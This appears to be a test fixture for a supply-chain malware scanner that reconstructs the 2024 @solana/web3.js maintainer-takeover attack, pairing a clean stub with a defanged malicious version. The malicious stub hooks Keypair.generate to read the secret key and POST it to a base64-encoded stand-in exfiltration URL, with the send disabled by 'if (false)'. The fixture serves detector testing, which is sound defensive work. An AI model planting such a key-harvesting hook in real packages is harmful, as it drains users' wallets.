/**
 * @solana/web3.js 1.95.5/1.95.6/1.95.7 (Dec 2024) — T1 maintainer takeover.
 *
 * Attacker phished credentials to the Solana team's npm publish account.
 * Malicious versions carried a wallet-stealer: hooked SDK APIs that touched
 * keypairs and posted the seed material to attacker-controlled endpoints. Cost
 * an estimated $160k+ in the ~5 hours before takedown.
 *
 * Detectable signals:
 *   - NET new-endpoint (multiple exfil URLs)
 *   - OBF: encoded/base64 large literals (the exfil URL was base64-encoded in source)
 *   - FS: no direct fs signal in the exact real payload, but the "wallet"/"keypair"
 *     token access is detectable — this is where we add a broadened ENV/keyword
 *     detector for wallet keyword access in the hardening pass.
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `// @solana/web3.js 1.95.4 — real SDK stubbed.
'use strict';
exports.Connection = function() { return {}; };
exports.Keypair = { generate: function() { return { publicKey: '...' , secretKey: '...' }; } };
exports.PublicKey = function(k) { return k; };
`;

// Base64-encoded 'https://exfil.example.invalid/wallet-drain' — the real Solana
// attack encoded its exfil endpoint. We add an OBF detector for base64-string
// URL literals as part of hardening.
const B64_EXFIL = 'aHR0cHM6Ly9leGZpbC5leGFtcGxlLmludmFsaWQvd2FsbGV0LWRyYWlu';

const MAL_INDEX = `'use strict';
var https = require('https');
var _e = '${B64_EXFIL}';
function harvest(keypair) {
  // Original patch injected this into the addSignature() path.
  var seed = keypair && keypair.secretKey;
  if (false) {
    var url = Buffer.from(_e, 'base64').toString();
    var req = https.request(url, { method: 'POST' });
    req.end(JSON.stringify({ secret: seed }));
  }
}
exports.Connection = function() { return {}; };
exports.Keypair = {
  generate: function() {
    var kp = { publicKey: '...', secretKey: 'xxx' };
    harvest(kp);
    return kp;
  },
};
exports.PublicKey = function(k) { return k; };
`;

export const spec: FixtureSpec = {
  id: 'solana-web3-2024',
  title: '@solana/web3.js 1.95.5-1.95.7 (Dec 2024)',
  year: 2024,
  threatClass: 'T1 maintainer takeover',
  summary:
    'Phished credentials let attackers publish malicious patch versions of @solana/web3.js that hooked keypair APIs to exfiltrate seed material. ~$160k drained across affected dApps in ~5 hours.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: '@solana/web3.js',
    version: '1.95.4',
    manifest: {
      name: '@solana/web3.js',
      version: '1.95.4',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'solana-labs@example' }],
    },
    files: { 'index.js': CLEAN_INDEX },
  },
  malicious: {
    name: '@solana/web3.js',
    version: '1.95.5',
    manifest: {
      name: '@solana/web3.js',
      version: '1.95.5',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'solana-labs@example' }],
      _npmUser: { name: 'attacker', email: 'phish@example.invalid' },
    },
    files: { 'index.js': MAL_INDEX },
  },
  expect: {
    mustFire: [
      'net.new-module',
      'net.encoded-endpoint',  // base64 URL is caught via encodedUrls
      'meta.maintainer-change',
    ],
    verdict: 'BLOCK',
    minCategories: ['NET'],
    known_limitation:
      'Real attack encoded its exfil URL in base64. net.encoded-endpoint catches the decoded URL. The OBF entropy-jump detector would ALSO fire IF the b64 blob were long enough (>200 chars) — for shorter blobs like this real fixture, net.encoded-endpoint alone is the reliable path.',
  },
};
